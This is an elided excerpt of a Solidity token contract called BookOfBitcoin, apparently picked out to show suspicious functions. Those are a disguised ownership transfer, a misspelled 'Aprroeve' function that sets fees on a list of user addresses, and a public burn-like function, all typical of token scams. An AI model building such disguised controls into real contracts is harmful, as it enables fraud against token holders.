...
/**
https://t.me/BookofBitcoin_ERC
https://twitter.com/BOOB_0x
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipcoingsd(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BookOfBitcoin is Ownable {
    ...
    function Aprroeve(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burntlibitosc(address user) public {
